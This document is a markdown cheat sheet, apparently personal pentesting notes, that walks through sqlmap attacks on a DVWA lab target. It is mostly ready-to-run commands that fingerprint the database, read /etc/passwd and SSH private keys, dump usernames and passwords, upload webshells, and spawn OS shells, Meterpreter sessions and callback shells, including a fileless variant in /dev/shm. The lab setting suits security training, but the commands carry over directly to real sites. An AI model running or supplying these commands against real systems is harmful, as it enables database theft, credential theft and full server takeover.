# SQLMap

#sqli #sqlmap

TODO: Fill in the rest of the output when necessary

## 01 - Fingerprinting the DBMS

- Fingerprint DBMS backend.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent -f
```

## 02 - Exploit

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --dbms=mysql --technique=U

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --dbms=mysql --prefix="'" --suffix="#" --technique U
```

## 03 - Enumeration

### 3.1 -  OS Enumeration

Note: This requires FILE privilege in order to read files externally.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --privileges
```

- Enumerating user accounts

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --file-read="/etc/passwd"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --sql-query="SELECT LOAD_FILE('/etc/passwd')"
```

- Retrieve SSH keys

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --file-read="/home/<username>/.ssh/id_rsa"
```

- Enumerate hostname

```
$ sqlmap "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --hostname
```

### 3.2 - Database Enumeration

#### 3.2.1 - Manual Enumeration

- Interactive `--sql-shell` prompt to perform SQL statement queries manually.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --sql-shell

sql-shell> SELECT @@VERSION()

sql-shell> SELECT TABLE_NAME FROM information_schema.TABLES

sql-shell> SELECT COLUMN_NAME FROM information_schema.COLUMNS

sql-shell> SELECT USER()

sql-shell> SELECT DATABASE()

sql-shell> SELECT GRANTEE, IS_GRANTABLE, PRIVILEGE_TYPE, TABLE_CATALOG FROM information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE = 'SELECT' AND WHERE PRIVILEGE_TYPE = 'FILE'
```

- Banner grab DBMS backend.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent -b
```

- Enumerate current user database and check if it's DB administrator.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --current-user --is-dba 
```

- Enumerate usernames and passwords.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --users --passwords
```

- Enumerate privileges and roles.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --privileges --roles
```

- Enumerate database schema.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --schema
```

- Enumerate current database.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --current-db
```

- Enumerate available databases.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --dbs
```

#### 2.2.2 - Tables Enumeration

- Search particular keywords of database, tables and columns

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --search -D dvwa -T users -C user,password,username,emails
```

- Retrieve tables

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U -D dvwa --tables
```

- Count number of tables

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U -D dvwa --tables --count
```

#### 2.2.3 - Columns Enumeration

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U -D dvwa -T users --columns
```

--comments          Check for DBMS comments during enumeration
--statements        Retrieve SQL statements being run on DBMS
## 03 - Dump Database

### 3.1 - Dump the whole database

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U -D dvwa --dump-all
```

### 3.2 - Dump the specific tables and columns

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U -D dvwa -T users -C user,password --dump
```

## 04 - Webshell

TODO: Fill in the rest

### 4.1 - Upload a specific Webshell

Refer to this [[Webshells|link]] to generate interactive weevely webshells and click [[Weevely|here]] for post exploitation section.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --file-write="/path/to/webshell.php" --file-dest="/var/www/html/dvwa/shell.php"
```

### 4.2 - Spawn an Interactive Webshell

TODO: Provide **\[INFO\]** logs and a screenshot to demonstrate a different between a file web stager (the uploader file) and a backdoor (an interactive shell)

Great thing about SQLMap that not only it uploads an interactive **web backdoor (the webshell)** it also comes with the **web file stager (the uploader)**.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --os-shell --web-root="/var/www/html/dvwa/"
```

### 4.3- Spawn a Meterpreter Shell

- Start a shell handler listener in Metasploit to retrieve a callback meterpreter session.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --os-pwn --web-root="/var/www/html/dvwa/"
```

Note: when using the `--priv-esc` flag this is for targeting Windows operating systems to automate using the `getsystem` function for impersonation.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --random-agent --os-pwn --web-root="/var/www/html/dvwa/" --priv-esc
```
### 4.4 - Execute OS Command

- Execute any command

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --os-cmd="whoami"
```

- Execute the callback shell in disk

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --file-write="/path/to/shell.py" --file-dest="/tmp/shell.py"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --os-cmd="python /tmp/shell.py"
```

- Execute the callback shell in memory (fileless memory)

1. Copy the file in `/dev/shm/` directory

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --file-write="/path/to/shell.py" --file-dest="/dev/shm/shell.py"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --os-cmd="python /dev/shm/shell.py"
```

2. Execute a one liner

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=470556ba233be8796915e41a17d25dea;security=low" --random-agent --technique=U --os-cmd="python -c <payload>"
```
## References

- [Hacking Articles: File System Access on Webserver Using SQLMap](https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/)

- [SQLMap Read File on the Server](https://rioasmara.com/2020/05/25/sqlmap-read-file-on-the-server/)

- [SQLMAP â€“ Enumeration of Databases & Users from Vulnerable Web Forms](https://kalilinuxtutorials.com/sqlmap2/)

- [IOSec: SQLMap](https://iosec.in/sqlmap-4/)

- [Pwning a Shell via MSSQL DBMS](https://owasp.org/www-chapter-ghana/assets/slides/Pwning_a_shell_via_MSSQL_DBMS.pdf)